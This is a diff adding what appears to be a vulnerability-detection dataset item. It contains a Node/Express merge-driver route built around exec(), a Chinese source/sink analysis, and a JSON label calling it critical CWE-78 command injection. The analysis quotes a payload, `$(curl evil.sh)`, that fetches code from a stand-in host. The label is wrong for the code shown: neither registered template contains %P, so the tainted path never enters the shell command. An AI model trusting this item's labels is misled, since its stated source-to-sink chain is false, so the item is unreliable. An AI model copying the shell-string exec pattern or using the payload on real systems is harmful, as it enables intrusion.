@@ -1,0 +1,59 @@
+LANG: node.js/javascript
+```javascript
+// merge-routes.js -- Express routes for custom merge driver execution
+const express = require('express');
+const { exec } = require('child_process');
+const fs = require('fs/promises');
+const path = require('path');
+
+const app = express();
+app.use(express.json());
+
+// Registry of merge driver commands, loaded from repo config (attacker-influenced)
+const mergeDrivers = {
+  text: 'git merge-file -p %A %O %B',
+  binary: 'merge-one-file %A %O %B'
+};
+
+// POST /api/merge/:driverName
+// Body: { ancestor, ours, theirs, path }
+app.post('/api/merge/:driverName', async (req, res) => {
+  const driverName = req.params.driverName;          // source: attacker-controlled route param
+  const command = mergeDrivers[driverName];
+  if (!command) return res.status(404).json({ error: 'unknown driver' });
+
+  const filePath = req.body.path || 'merged.txt';    // source: attacker-controlled file path
+  const tmpdir = await fs.mkdtemp('/tmp/merge-');
+  const oursPath = path.join(tmpdir, 'ours');
+  const theirsPath = path.join(tmpdir, 'theirs');
+  const basePath = path.join(tmpdir, 'base');
+
+  await fs.writeFile(basePath, Buffer.from(req.body.ancestor || '', 'base64'));
+  await fs.writeFile(oursPath, Buffer.from(req.body.ours || '', 'base64'));
+  await fs.writeFile(theirsPath, Buffer.from(req.body.theirs || '', 'base64'));
+
+  // Substitute placeholders exactly like the original driver protocol
+  let cmd = command
+    .replace('%A', oursPath)
+    .replace('%B', theirsPath)
+    .replace('%O', basePath)
+    .replace('%L', String(req.body.markerSize || 7))
+    .replace('%P', filePath);                        // tainted value flows into shell string
+
+  exec(cmd, async (err, stdout) => {                 // sink: shell=True equivalent, no escaping
+    const merged = await fs.readFile(oursPath, 'utf8').catch(() => '');
+    res.json({ merged, success: !err });
+  });
+});
+
+app.listen(3000);
+```
+
+1. 第 20 行：`req.params.driverName` 与第 21 行 `req.body.path` 是外部输入入口（source），攻击者可通过恶意分支/请求体控制 `path`，等价于原代码中来自 git 树的文件路径。
+2. 第 33–37 行：占位符替换逻辑与原 `ProcessMergeDriver.merge` 完全同构——`%P` 被直接替换为未校验的 `filePath`。
+3. 第 39 行：`exec(cmd)` 等价于原代码的 `subprocess.run(shell=True)`，将拼接后的字符串交给 `/bin/sh` 执行（sink）。
+4. 全程无任何过滤、白名单或转义：`path` 中若含 `` `id` `` 或 `$(curl evil.sh)` 等 shell 元字符即被解释执行；`driverName` 虽有注册表查找限制，但 `%P` 注入通道完全开放，防御缺失与原漏洞一致。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "critical", "source": "line 21: req.body.path 攻击者可控的文件路径", "sink": "line 39: exec(cmd) 将含未转义路径的命令串交给 shell 执行", "explanation": "第 21 行攻击者控制的 path -> 第 36 行 replace('%P', filePath) 拼入命令模板 -> 第 39 行 exec 无任何转义直接执行 -> 任意命令注入", "fix_suggestion": "line 36: 对 filePath 做严格校验（仅允许安全路径字符）并使用 execFile 以参数数组形式传递，避免 shell 解释"}
+```
